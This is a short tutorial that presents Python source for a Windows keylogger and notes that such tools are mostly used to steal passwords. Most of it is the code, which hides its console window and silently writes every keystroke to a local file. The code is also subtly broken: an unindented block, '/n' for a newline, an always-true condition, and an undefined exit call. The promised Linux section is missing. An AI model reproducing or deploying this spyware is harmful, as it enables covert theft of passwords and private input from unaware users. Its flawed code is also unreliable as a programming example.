Keystroke logging is the process of recording (logging) the keys pressed on a keyboard (usually when the user is unaware). It is also known as keylogging or keyboard capturing.
These programs are used for troubleshooting technical problems with computers and business networks. It can also be used to monitor network usages but more often than not it is used for malicious intents like stealing passwords.
This article illustrates designing a keylogger for windows and Linux.
 

Keylogger for Windows

Download some python libraries 
1) pywin32 
2) pyhook

Following is the code to create a keylogger in python

import win32api
import win32console
import win32gui
import pythoncom, pyHook

win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)

def OnKeyboardEvent(event):
	if event.Ascii==5:
		_exit(1)
	if event.Ascii !=0 or 8:

		f = open('c:\output.txt', 'r+')
		buffer = f.read()
		f.close()

		f = open('c:\output.txt', 'w')
		keylogs = chr(event.Ascii)
		if event.Ascii == 13:
		keylogs = '/n'
		buffer += keylogs
		f.write(buffer)
		f.close()

hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent

hm.HookKeyboard()

pythoncom.PumpMessages()
#end  of the program

Save the file in C:\ as Keylogger.py and run the python file 
Output: 
The keylogger will be started in the background and save all the data on the log file “c:\output.txt”.
